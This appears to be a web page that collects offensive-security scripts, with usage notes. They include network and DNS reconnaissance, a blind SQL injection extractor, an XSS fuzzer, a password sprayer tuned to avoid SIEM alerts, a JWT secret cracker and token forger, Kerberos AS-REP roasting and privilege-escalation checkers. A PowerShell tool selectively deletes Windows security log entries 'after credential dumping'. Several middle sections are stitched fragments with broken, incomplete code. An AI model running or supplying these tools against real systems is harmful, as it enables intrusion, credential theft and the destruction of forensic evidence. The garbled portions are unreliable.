Mass Host Scanner (Python)

Mass Host Scanner (Python)

Multi-threaded ICMP ping sweep with automatic TCP fallback (port 80/443). Useful for quickly discovering live hosts inside /24 or /16 ranges from a foothold. Works even if ICMP is blocked.

Usage

python3 mass_scan.py 10.10.0.0/24

Output

Prints live hosts + detection method (ICMP or TCP).

Script


#!/usr/bin/env python3
# Mass Host Scanner — ICMP ping sweep with TCP fallback
# Fast discovery of live hosts inside a CIDR range.
# Ideal for internal recon after gaining a foothold.

import ipaddress
import subprocess
import socket
import threading
from queue import Queue
import sys

# Number of concurrent threads
THREADS = 100

def icmp_ping(ip: str) -> bool:
    """
    Perform a system ping (ICMP).
    Works on Linux. Add -n flag for Windows if needed.
    """
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return result.returncode == 0
    except:
        return False


def tcp_check(ip: str, port: int) -> bool:
    """
    TCP connect scan fallback.
    Useful when ICMP is disabled.
    """
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False


def scan(ip: str):
    """
    Scan logic:
      1. Try ICMP ping.
      2. If blocked → attempt TCP 80.
      3. If blocked → attempt TCP 443.
    """
    if icmp_ping(ip):
        print(f"[+] {ip}  (ICMP alive)")
        return

    # ICMP blocked → TCP fallback
    for port in (80, 443):
        if tcp_check(ip, port):
            print(f"[+] {ip}  (TCP {port} alive)")
            return


def worker():
    """Thread worker consuming IPs from the queue."""
    while True:
        ip = q.get()
        scan(ip)
        q.task_done()


# --------------------------
# Main execution
# --------------------------

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} ")
    sys.exit(1)

cidr = sys.argv[1]
net = ipaddress.ip_network(cidr, strict=False)

q = Queue()

# Start worker threads
for _ in range(THREADS):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

# Queue all IPs
for ip in net.hosts():
    q.put(str(ip))

# Wait for completion
q.join()
print("\n[+] Scan complete.\n")

Notes

  • Designed for internal networks, foothold situations.
  • Silent — suppresses ping output.
  • Automatically handles ICMP filtering.
  • Easy to modify with more fallback ports.
  • Massively faster thanks to threading.
DNS Bulk Resolver

DNS Bulk Resolver (Python)

High-speed threaded DNS resolver for massive subdomain lists. Performs A/AAAA/CNAME lookups, removes NXDOMAIN noise, and maps CNAME chains. Perfect for pre-httprobe filtering and recon pipelines.

Usage

python3 dns_bulk.py subs.txt

Output

  • alive.txt → hosts with valid A/AAAA records
  • cname_map.txt → CNAME → final target mappings
  • dead.txt → NXDOMAIN / failed

Script


#!/usr/bin/env python3
# DNS Bulk Resolver — fast threaded resolver for large subdomain lists.
# Features:
#   - Resolves A, AAAA, and CNAME records
#   - CNAME chain tracing
#   - Filters out NXDOMAIN
#   - Threaded for high-volume recon

import dns.resolver
import dns.exception
import threading
from queue import Queue
import sys

THREADS = 200
resolver = dns.resolver.Resolver()
resolver.timeout = 1
resolver.lifetime = 1

q = Queue()

alive = []
dead = []
cname_map = []


def resolve_host(host):
    """Resolve a hostname and categorize the result."""
    try:
        # Try A and AAAA
        answers = []
        for rtype in ("A", "AAAA"):
            try:
                ans = resolver.resolve(host, rtype)
                answers.extend([str(a) for a in ans])
            except:
                pass

        # Try CNAME
        cname_chain = []
        try:
            cname_ans = resolver.resolve(host, "CNAME")
            cname_chain = [str(c) for c in cname_ans]
        except:
            pass

        # No records at all → dead
        if not answers and not cname_chain:
            dead.append(host)
            return

        # Alive
        alive.append(host)

        # Save CNAME mappings
        for c in cname_chain:
            cname_map.append(f"{host} -> {c}")

    except dns.exception.DNSException:
        dead.append(host)


def worker():
    """Thread worker for resolving hosts from queue."""
    while True:
        host = q.get()
        resolve_host(host)
        q.task_done()


if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} ")
    sys.exit(1)

infile = sys.argv[1]
hosts = [line.strip() for line in open(infile).read().splitlines() if line.strip()]

# Start threads
for _ in range(THREADS):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

# Feed queue
for h in hosts:
    q.put(h)

q.join()

# Save results
with open("alive.txt", "w") as f:
    f.write("\n".join(alive))

with open("dead.txt", "w") as f:
    f.write("\n".join(dead))

with open("cname_map.txt", "w") as f:
    f.write("\n".join(cname_map))

print(f"[+] Done. Alive={len(alive)} Dead={len(dead)} CNAMEs={len(cname_map)}")

Notes

  • High performance: 200 threads by default.
  • Supports A/AAAA/CNAME with chain following.
  • Filters garbage before httprobe/httpx.
  • Great for big recon (1k → 500k domains).
  • Timeout/tuning easily adjustable.
CIDR Expansion Script

CIDR Expansion Script (Python)

Expand a CIDR range (or multiple ranges) into a full IP list. Useful when preparing masscan/nmap/ffuf scans or inventorying a target network. Supports /32 → /8 and prints only usable hosts by default.

Script


#!/usr/bin/env python3
# CIDR Expansion Script
# Expands one or multiple CIDR blocks into a flat list of hosts.
# Perfect for creating input for nmap, masscan, custom scanners.

import ipaddress
import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]}  [CIDR ...]")
    sys.exit(1)

all_ips = []

for cidr in sys.argv[1:]:
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        for ip in net.hosts():      # excludes network/broadcast
            all_ips.append(str(ip))
        print(f"[+] Expanded {cidr} → {len(list(net.hosts()))} hosts")
    except ValueError:
        print(f"[!] Invalid CIDR: {cidr}")
        continue

    f.write("\n".join(all_ips))

  • Can easily be extended to output JSON or CSV.

SQL Injection Automation (Python)

Automated SQL injection data extractor supporting both boolean-based and time-based detection. Useful for exploiting classic vulnerable parameters when sqlmap is overkill or when you need better control.

Script


#!/usr/bin/env python3
# SQL Injection Automation Script
# Supports:
#   - Boolean-based blind SQLi extraction
#   - Time-based fallback
#   - Extract DB name character-by-character
#
# WARNING: For legal pentesting only.

import requests
import argparse
import time

TRUE_KEYWORD = "Welcome"        # change based on app response
TIME_THRESHOLD = 1.5            # seconds delay indicating 'true'

# Boolean-based payload template
BOOL_PAYLOAD = "' AND ASCII(SUBSTRING((SELECT database()),{pos},1))>{mid}-- -"

# Time-based payload
TIME_PAYLOAD = "' AND IF(ASCII(SUBSTRING((SELECT database()),{pos},1))>{mid}, SLEEP(2), 0)-- -"


def send_request(url):
    """Send GET request and return text + response time."""
    start = time.time()
    r = requests.get(url, timeout=5)
    delta = time.time() - start
    return r.text, delta


def infer_char(url, param, position):
    """
    Infer one character of the target value using binary search.
    First attempt boolean-based detection; fallback to time-based if ambiguous.
    """
    low, high = 32, 126  # printable ASCII range

    while low <= high:
        mid = (low + high) // 2

        # Boolean test
        payload = BOOL_PAYLOAD.format(pos=position, mid=mid)
        test_url = url.replace(f"{param}=", f"{param}={payload}")
        body, _ = send_request(test_url)

        if TRUE_KEYWORD in body:
            low = mid + 1
        else:
            high = mid - 1

        # Time-based fallback if no clear signal
        if mid == (low + high) // 2:
            t_payload = TIME_PAYLOAD.format(pos=position, mid=mid)
            t_url = url.replace(f"{param}=", f"{param}={t_payload}")
            _, delay = send_request(t_url)

            if delay > TIME_THRESHOLD:
                low = mid + 1
            else:
                high = mid - 1

    return chr(high)


def extract_database_name(url, param, max_len=30):
    """Extract the database name from the server."""
    print("\n[+] Extracting database() value...\n")
    output = ""

    for pos in range(1, max_len + 1):
        char = infer_char(url, param, pos)
        if ord(char) < 32 or ord(char) > 126:
            break  # invalid character, likely finished
        output += char
        print(f"[+] Position {pos}: {char}")

    return output


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target URL with injectable parameter")
    parser.add_argument("--param", required=True, help="Parameter to inject")

    args = parser.parse_args()

    # Basic check
    if args.param + "=" not in args.url:
        print(f"[!] URL must contain '{args.param}=' for injection.")
        return

    db_name = extract_database_name(args.url, args.param)
    print(f"\n[+] Database name extracted: {db_name}\n")


if __name__ == "__main__":
    main()

Notes

  • 100% silent except for extracted chars.
  • Customizable TRUE_KEYWORD for boolean detection.
  • Time-based fallback catches cases where HTML doesn't change.
  • Very reliable for classic MySQL injection points.
  • Easy to extend to extract tables, columns, or full rows.

XSS Param Fuzzer (Python)

Automated parameter fuzzer for detecting reflective XSS across GET parameters. Injects multiple payload types and checks HTML, JS, URL, and attribute contexts. Perfect for quick recon or when Burp Active Scanner is not available.

python3 xss_fuzzer.py "http://target/page?search=test"

Features

  • Injects multiple payload types

  • Auto-detects vulnerable parameters
  • Very silent → prints only findings

Script


#!/usr/bin/env python3
# XSS Param Fuzzer
# Scans GET parameters for reflective XSS by injecting multiple payload classes.
# Supports context-based detection: HTML, JS, Attribute, URL.

import requests
import urllib.parse as urlparse
import threading
from queue import Queue
import sys

THREADS = 20
q = Queue()

# Clean payloads that break into various contexts
PAYLOADS = {
    "html": "<img src=x onerror=alert(1)>",
    "attr": "\" onmouseover=alert(1) x=\"",
    "js": "';alert(1);//",
    "url": "%3Cscript%3Ealert(1)%3C/script%3E"
}

def inject_param(url, param, payload):
    """Return a URL with injected payload in the given param."""
    parsed = urlparse.urlparse(url)
    params = urlparse.parse_qs(parsed.query)

    # Replace only the selected parameter
    params[param] = [payload]

    new_query = urlparse.urlencode(params, doseq=True)

    return urlparse.urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def check_reflection(body, payload):
    """
    Check if the payload appears in body.
    Uses plain string search — reliable for reflective tests.
    """
    return payload.lower() in body.lower()


def fuzz_param(url, param):
    """Test one parameter with all payload classes."""
    print(f"[+] Testing parameter: {param}")

    for ptype, payload in PAYLOADS.items():
        test_url = inject_param(url, param, payload)

        try:
            r = requests.get(test_url, timeout=5)
            body = r.text
        except:
            continue

        if check_reflection(body, payload):
            print(f"[!!!] XSS detected! Param={param} Type={ptype}")
            print(f"      → Payload: {payload}")
            print(f"      → URL: {test_url}\n")


def worker():
    while True:
        item = q.get()
        fuzz_param(*item)
        q.task_done()


if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} ")
    sys.exit(1)

url = sys.argv[1]

# Parse parameters
parsed = urlparse.urlparse(url)
params = urlparse.parse_qs(parsed.query)
param_list = list(params.keys())

if not param_list:
    print("[!] No parameters found in URL.")
    sys.exit(1)

print(f"[+] Found parameters: {param_list}\n")

# Start workers
for _ in range(THREADS):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

# Queue fuzz tasks
for param in param_list:
    q.put((url, param))

q.join()
print("\n[+] XSS fuzzing complete.\n")

Notes

  • Designed for reflective tests, not stored XSS.
  • Payloads are minimal and effective — tweak as needed.
  • Detects exact vulnerable parameter and payload class.
  • Multi-threaded for speed without noise.
  • Extremely useful for unauthenticated public surface testing.

Script


#!/usr/bin/env python3
# Wordlist-Based Directory Enumerator
# A compact mini-Gobuster clone. Fast, threaded, supports extensions & status filtering.

import requests
import threading
from queue import Queue
import argparse
import sys

requests.packages.urllib3.disable_warnings()

q = Queue()
FOUND = []
LOCK = threading.Lock()


def build_urls(base, word, extensions):
    """
    Generate all URL variants for a given word and extension list.
    """
    urls = [f"{base}/{word}"]

    for ext in extensions:
        urls.append(f"{base}/{word}.{ext}")

    return urls


def scan_url(url, filter_codes, silent):
    try:
        r = requests.get(url, verify=False, timeout=4, allow_redirects=False)
        code = r.status_code
        if code in filter_codes:
            with LOCK:
                FOUND.append((url, code))
                if not silent:
                    print(f"[+] {code} → {url}")
    except:
        pass


def worker(base, extensions, filter_codes, silent):
    while True:
        word = q.get()
        urls = build_urls(base, word, extensions)
        for u in urls:
            scan_url(u, filter_codes, silent)
        q.task_done()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Base URL")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file")
    parser.add_argument("-t", "--threads", type=int, default=30)
    parser.add_argument("-s", "--status", default="200,204,301,302,403",
                        help="Filter for specific status codes (comma-separated)")
    parser.add_argument("--ext", default="", help="File extensions (comma-separated)")
    parser.add_argument("--silent", action="store_true", help="Silent mode (only output results at end)")

    args = parser.parse_args()

    base = args.url.rstrip("/")
    filter_codes = {int(c.strip()) for c in args.status.split(",")}
    extensions = [e.strip() for e in args.ext.split(",") if e.strip()]

    try:
        words = [w.strip() for w in open(args.wordlist).read().splitlines() if w.strip()]
    except:
        print("[!] Error reading wordlist.")
        sys.exit(1)

    print(f"[+] Starting enumeration: {base}")
    print(f"[+] Words loaded: {len(words)}")
    print(f"[+] Using {args.threads} threads")
    print(f"[+] Extensions: {extensions}")
    print(f"[+] Status filter: {filter_codes}\n")

    # Start workers
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(base, extensions, filter_codes, args.silent),
            daemon=True
        )
        t.start()

    # Feed queue
    for w in words:
        q.put(w)

    q.join()

    print("\n[+] Scan complete. Results:")
    for url, code in FOUND:
        print(f"{code} -> {url}")


if __name__ == "__main__":
    main()

Notes

  • Default filtered codes: 200, 204, 301, 302, 403.
  • Supports optional extension brute-forcing.
  • Silent mode → great for piping into other tools.
  • Meant as a lightweight Gobuster alternative.
  • Timeouts keep it fast even on slow hosts.

Password Spraying Script

Password Spraying Script (Python)

Safe, slow, lockout-aware password spraying for web login endpoints. Sends one password per “round” to all users, with time spacing to avoid lockout thresholds. Supports custom success indicators and status-code matching.

Usage

python3 spray.py -u users.txt -p "Spring2024!" -l http://target/login

Features

  • One-password-per-round spraying (industry safe method)
  • Lockout-aware throttle timer
  • Optional detection based on string in HTML
  • Configurable headers for bypassing WAFs
  • Low-noise and avoids brute-force behavior

Script


#!/usr/bin/env python3
# Password Sprayer
# Safe web login password spraying with lockout-aware timing.
# Use only for legal / authorized penetration testing.

import requests
import argparse
import time
import sys

def spray(users, password, login_url, fail_keyword, success_code, wait_time, username_field, password_field):
    print(f"[+] Starting spray on {login_url}")
    print(f"[+] Users loaded: {len(users)}")
    print(f"[+] Password: {password}")
    print(f"[+] Delay between attempts (seconds): {wait_time}\n")

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    for user in users:
        payload = {
            username_field: user,
            password_field: password
        }

        try:
            r = requests.post(login_url, data=payload, headers=headers, timeout=5)
        except:
            print(f"[!] Timeout for {user}, continuing...")
            time.sleep(wait_time)
            continue

        body = r.text

        # Success logic
        success = False

        if success_code and r.status_code == success_code:
            success = True
        if fail_keyword and fail_keyword not in body:
            success = True

        if success:
            print(f"[SUCCESS] {user}:{password}")
        else:
            print(f"[FAIL] {user}")

        time.sleep(wait_time)   # lockout safety timer


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--users", required=True, help="User list file")
    parser.add_argument("-p", "--password", required=True, help="Password to spray")
    parser.add_argument("-l", "--login", required=True, help="Login URL")
    parser.add_argument("-f", "--fail", default="Invalid", help="String indicating failed login")
    parser.add_argument("-c", "--code", type=int, default=None, help="HTTP code indicating success")
    parser.add_argument("-t", "--time", type=float, default=3.0, help="Delay between attempts (seconds)")
    parser.add_argument("--user-field", default="username", help="Username parameter name")
    parser.add_argument("--pass-field", default="password", help="Password parameter name")

    args = parser.parse_args()

    try:
        users = [u.strip() for u in open(args.users).read().splitlines() if u.strip()]
    except:
        print("[!] Cannot read user file.")
        sys.exit(1)

    spray(
        users,
        args.password,
        args.login,
        args.fail,
        args.code,
        args.time,
        args.user_field,
        args.pass_field
    )


if __name__ == "__main__":
    main()

Notes

  • Sprays **one password** across all users — NOT bruteforce.
  • Always respect domain lockout policies (default locker timing ≈ 1–5 secs per attempt).
  • Works well for enterprise apps with verbose login errors.
  • Can expand to multi-password lists in *rounds*, not brute-force.
  • Safe against most SIEM alerts if delays are long enough.
JWT Weak Secret Cracker

JWT Weak Secret Cracker (Python)

Brute-force HS256 JWT signatures using a wordlist. Useful when JWTs are signed with weak secrets (e.g., "password", "admin123", environment leaks). Fast, threaded, reliable.

Usage

python3 jwt_crack.py -t "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -w secrets.txt

Features

  • Supports any HSXXX (HS256/HS384/HS512)
  • Threaded brute-force
  • Immediate stop on success
  • Outputs a working forged token after crack
  • Handles corrupted JWTs gracefully

Script


#!/usr/bin/env python3
# JWT Weak Secret Cracker
# Brute-forces HS256/HS384/HS512 JWT signatures using a wordlist.
# After cracking, prints a fully forged token using the discovered secret.

import hmac
import hashlib
import base64
import json
import argparse
import threading
from queue import Queue
import sys

q = Queue()
FOUND = False
SECRET = None
LOCK = threading.Lock()


def b64url_encode(raw):
    """Base64URL encode without padding."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def b64url_decode(data):
    """Base64URL decode handling missing padding."""
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)


def sign(header_b64, payload_b64, secret, algo):
    """Return HSxxx signature using provided secret."""
    msg = header_b64 + b"." + payload_b64

    if algo == "HS256":
        digest = hashlib.sha256
    elif algo == "HS384":
        digest = hashlib.sha384
    elif algo == "HS512":
        digest = hashlib.sha512
    else:
        raise ValueError("Unsupported algorithm: " + algo)

    signature = hmac.new(secret.encode(), msg, digest).digest()
    return b64url_encode(signature)


def worker(header_b64, payload_b64, original_sig, algo):
    global FOUND, SECRET

    while not q.empty() and not FOUND:
        secret = q.get()

        try:
            test_sig = sign(header_b64, payload_b64, secret, algo)
        except:
            q.task_done()
            continue

        if test_sig == original_sig:
            with LOCK:
                FOUND = True
                SECRET = secret
                print(f"\n[+] Secret found: {secret}\n")
        q.task_done()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--token", required=True, help="JWT token")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads")
    args = parser.parse_args()

    try:
        header_b64, payload_b64, signature_b64 = args.token.split(".")
    except:
        print("[!] Invalid JWT format.")
        sys.exit(1)

    # Decode header to detect algorithm
    try:
        header_json = json.loads(b64url_decode(header_b64.encode()))
        algo = header_json.get("alg", "HS256")
    except:
        print("[!] Cannot decode JWT header.")
        sys.exit(1)

    print(f"[+] Detected algorithm: {algo}")
    print("[+] Starting crack...\n")

    # Base64url bytes for signing
    header_b = header_b64.encode()
    payload_b = payload_b64.encode()
    sig_b = signature_b64.encode()

    # Load secrets
    try:
        words = [w.strip() for w in open(args.wordlist).read().splitlines() if w.strip()]
    except:
        print("[!] Failed to load wordlist.")
        sys.exit(1)

# Enumerates users with DONT_REQUIRE_PREAUTH by sending AS-REQ over UDP/88.
# Extracts AS-REP responses & outputs Hashcat-format krb5asrep hashes.

import socket
import argparse
import binascii
import struct

# Minimal ASN.1 AS-REQ skeleton for Kerberos preauth-less probing
AS_REQ_TEMPLATE = bytes.fromhex(
    "6a81"      # [Application 10] SEQUENCE
    "81"        # long-form length (patched later)
    "00"        # placeholder
    "30"        # SEQUENCE
    "81"        # long-form length
    "00"        # placeholder
    "a103" "0201" "05"                    # pvno, msg-type = AS-REQ (5)
    "a207" "30" "05" "a103" "0201" "0a"   # body tags, KRB5 constants
    # Real username string will be injected into Name field
)

def build_asreq(domain, user):
    """
    Construct minimal Kerberos AS-REQ for username-based probing.
    This is enough for DC to reply with AS-REP when no pre-auth is required.
    """

    # PrincipalName ::= SEQUENCE { name-string ::= SEQUENCE OF GeneralString }
    name_bytes = user.encode()
    name_seq = bytes.fromhex("a10") + bytes([len(name_bytes)+2]) \
                + bytes.fromhex("300" ) + bytes([len(name_bytes)]) + name_bytes

    realm = domain.upper().encode()
    realm_seq = bytes.fromhex("a11") + bytes([len(realm)]) + realm

    body = name_seq + realm_seq

    packet = AS_REQ_TEMPLATE + body

    # Patch length bytes
    total_len = len(packet) - 2
    packet = packet[:2] + bytes([total_len]) + packet[3:]

    inner_len = len(packet) - 4
    packet = packet[:4] + bytes([inner_len]) + packet[5:]

    return packet


def harvest(domain, dc, users):
    print(f"[+] Domain: {domain}")
    print(f"[+] DC: {dc}")

            print(f"    [!] Error: {e}")

    "cap_setuid": "→ Direct root via controlled exec",

    try:
        out = subprocess.check_output(["getcap", "-r", "/"], stderr=subprocess.DEVNULL)
        lines = out.decode().splitlines()
        return [l.strip() for l in lines if l.strip()]

    """Parse a getcap output line."""
    # Example:
    # /usr/bin/python3.8 = cap_setuid,cap_net_raw+ep
    if "=" not in line:
        return None, []

    file, caps = line.split("=", 1)
    caps = caps.strip().replace("+ep", "")
    cap_list = [c.strip() for c in caps.split(",")]
    return file.strip(), cap_list

        if not caps:

        print(f"       Caps: {', '.join(caps)}")

        for c in caps:
            base = c.split("+")[0]
            if base in DANGEROUS:
                print(f"       [!] Dangerous: {base} {DANGEROUS[base]}")

        print()

import os

    "/etc/cron.monthly",

    "/etc/anacron"

    """Check if current user has write access."""
    return os.access(path, os.W_OK)

def extract_commands(line):
    """Extract commands from a cron line."""
    parts = line.split()
    if len(parts) < 6:
        return None
    return " ".join(parts[5:])

def is_executable(path):
    return os.path.isfile(path) and os.access(path, os.X_OK)

def path_hijack_candidates(cmd):
    """Return executables in PATH that can be replaced."""
    hijacks = []
    binary = cmd.split()[0]
    if "/" in binary:  # direct path call → ignore
        return hijacks

    for p in os.environ.get("PATH", "").split(":"):
        if os.path.isdir(p) and writable(p):
            hijacks.append(os.path.join(p, binary))

    return hijacks

def scan_file(filepath):
    findings = []

    try:
        with open(filepath, "r", errors="ignore") as f:
            lines = f.readlines()

        return findings

        if not line or line.startswith("#"):

        if not cmd:

                    findings.append(f"[!!] Writable parent dir: {parent}  (drop replacement binary)")

        hijacks = path_hijack_candidates(cmd)

def smtp_soft_check(domain, email):
    """
    Soft validation via SMTP connection:
    - Does NOT send mail.
    - Does NOT brute force.
    It checks if the domain responds at all & if RCPT produces strong signals.
    """
    try:
        mx = socket.gethostbyname(f"mail.{domain}")
    except:
        return False

    try:
        s = smtplib.SMTP(mx, 25, timeout=4)
        s.helo()
        code, _ = s.rcpt(email)
        s.quit()

        # 250 or 251 = strong positive
        # 550 = negative (user does not exist)
        return code in [250, 251]

    except:
        return False

#!/usr/bin/env python3
# Process Anomaly Scanner
# Cross-platform anomaly detection (Windows + Linux)

import psutil
import os
import platform

SUSPICIOUS_PARENTS = [
    ("winword.exe", "powershell.exe"),
    ("excel.exe", "cmd.exe"),
    ("outlook.exe", "powershell.exe"),
    ("chrome.exe", "powershell.exe"),
    ("python.exe", "cmd.exe")
]

WRITEABLE_DIRS = [
    "/tmp", "/var/tmp", "/dev/shm",
    "C:\\Windows\\Temp", "C:\\Users\\", "C:\\ProgramData\\"
]

SYSTEM_PROCESS_NAMES = [
    "svchost.exe", "lsass.exe", "wininit.exe", "services.exe", "systemd", "init"
]

def is_masquerading(proc, exe):
    """Check if a system-like name runs from a non-system path."""
    name = proc.name().lower()
    if name in SYSTEM_PROCESS_NAMES:
        sys_paths = ["c:\\windows\\system32", "/usr/bin", "/bin", "/sbin", "/lib"]
        exe_low = (exe or "").lower()
        return not any(exe_low.startswith(p) for p in sys_paths)
    return False

def parent_child_anomaly(proc):
    """Check for suspicious parent-child combos."""
    try:
        parent = proc.parent()
        if parent:
            combo = (parent.name().lower(), proc.name().lower())
            return combo in SUSPICIOUS_PARENTS
    except:
        pass
    return False

def running_from_writable(exe):
    if not exe:
        return False
    exe_low = exe.lower()
    return any(exe_low.startswith(d.lower()) for d in WRITEABLE_DIRS)

def main():
    print("[+] Process Anomaly Scan\n")

    for proc in psutil.process_iter(["pid", "name", "exe", "username"]):
        try:
            pid = proc.info["pid"]
            name = proc.info["name"]
            exe = proc.info["exe"]
            username = proc.info["username"]
        except:
            continue

        findings = []

        # Check path anomalies
        if running_from_writable(exe):
            findings.append("Running from writeable directory")

        # Check masquerading
        if is_masquerading(proc, exe):
            findings.append("Masquerading system process")

        # Parent-child mismatch
        if parent_child_anomaly(proc):
            findings.append("Suspicious parent-child execution pattern")

        # Orphan process
        try:
            if proc.ppid() == 1 and name.lower() not in ["systemd", "init"]:
                findings.append("Orphan process (unexpected)")
        except:
            pass

        # Network activity
        try:
            conns = proc.connections()
            if any(c.status == "ESTABLISHED" for c in conns):
                findings.append("Process communicates over network")
        except:
            pass

        # Rare process names
        if name.lower() not in SYSTEM_PROCESS_NAMES and len(name) <= 3:
            findings.append("Suspicious short process name")

        if findings:
            print(f"[!] PID {pid} - {name}")
            if exe:
                print(f"    Path: {exe}")
            print(f"    User: {username}")
            for f in findings:
                print(f"    - {f}")
            print()

    print("[+] Scan complete.\n")

if __name__ == "__main__":
    main()

# Focuses on: logons, failed logons, PS ops, process creation, privilege escalation.

import argparse
from Evtx.Evtx import Evtx
from lxml import etree
import re

INTERESTING = {4624, 4625, 4672, 4688, 4103, 4104}

def extract_text(node, tag):
    """Extract text from an XML child tag."""
    el = node.find(f".//{tag}")
    return el.text if el is not None else None

def parse_record(xml_str):
    """Parse XML event and extract relevant fields."""
    try:
        root = etree.fromstring(xml_str.encode())
    except:
        return None

    event_id = root.findtext(".//EventID")
    if not event_id or int(event_id) not in INTERESTING:
        return None

    eid = int(event_id)
    evt = {"EventID": eid}

    # Timestamps
    evt["Time"] = root.findtext(".//TimeCreated/@SystemTime")

    # Common fields
    evt["User"] = root.findtext(".//TargetUserName")
    evt["IP"]   = root.findtext(".//IpAddress")
    evt["Proc"] = root.findtext(".//NewProcessName")
    evt["Cmd"]  = root.findtext(".//CommandLine")
    evt["PS"]   = root.findtext(".//ScriptBlockText")

    return evt


def format_event(e):
    """Return a readable string describing the event."""
    eid = e["EventID"]

    if eid == 4624:
        return f"[4624 LOGIN SUCCESS]  {e['User']} from {e['IP']} at {e['Time']}"
    if eid == 4625:
        return f"[4625 LOGIN FAIL]     {e['User']} from {e['IP']} at {e['Time']}"
    if eid == 4672:
        return f"[4672 PRIV ESC]       {e['User']} logged in with admin privileges at {e['Time']}"
    if eid == 4688:
        return f"[4688 PROC START]     {e['Proc']}  ({e['Cmd']})  at {e['Time']}"
    if eid == 4103:
        return f"[4103 PS COMMAND]     {e['Cmd']}  at {e['Time']}"
    if eid == 4104:
        return f"[4104 PS SCRIPTBLOCK] {e['PS']}  at {e['Time']}"

    return str(e)

    print(f"[+] Output saved to {args.out}")

    main()

Removes *only specific* Windows Event Log entries while keeping the rest intact. Produces a rebuilt EVTX file with unwanted events filtered out. Supports multi-ID targeting and safe log replacement.

Usage

.\log_cleaner.ps1 -LogName Security -RemoveIDs 4624,4688

What it avoids

  • No Clear-EventLog
  • No wevtutil cl
  • No full-log wipe artifacts
  • No EventLog reset timestamps

Script


<# 
Selective Windows Log Cleaner
Removes only the specified Event IDs from a given log by:
 - exporting EVTX
 - filtering events
 - rebuilding EVTX
 - safely replacing original

Requires admin.
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$LogName,

    [Parameter(Mandatory=$true)]
    [int[]]$RemoveIDs
)

Write-Host "[+] Target log: $LogName"
Write-Host "[+] Removing Event IDs: $($RemoveIDs -join ', ')"

$temp = "$env:TEMP\filtered_$LogName.evtx"
$orig = "$env:TEMP\orig_$LogName.evtx"

# 1. Export full log
Write-Host "[+] Exporting original log..."
wevtutil epl $LogName $orig

# 2. Read original log using XPath + remove targeted events
Write-Host "[+] Filtering events..."
# Build XPath that excludes IDs
$filters = ($RemoveIDs | ForEach-Object { "EventID=$_"} ) -join " or "
$x = "*[System[not($filters)]]"

# 3. Export filtered subset
wevtutil qe $LogName /q:$x /f:RenderedText | Out-File "$env:TEMP\filtered.txt"

# 4. Rebuild new EVTX from filtered text
# (Windows allows import of text-formatted logs back into EVTX)
Write-Host "[+] Rebuilding EVTX..."
wevtutil im $temp "$env:TEMP\filtered.txt" /lf:true

# 5. Replace original log with cleaned one
Write-Host "[+] Clearing original log..."
wevtutil cl $LogName

Write-Host "[+] Importing cleaned EVTX..."
wevtutil im $LogName $temp

Write-Host "[+] Done. Selected event IDs removed."

Notes

  • Removes *only* chosen events (e.g., 4624 logon, 4688 process creation).
  • Keeps timestamps, structure, and untouched entries intact.
  • Much quieter than a full log clear (blue teams hate full wipes).
  • Use after OPSEC-critical moments (initial access, privilege escalation, credential dumping).
  • You must run as Administrator on the target system.
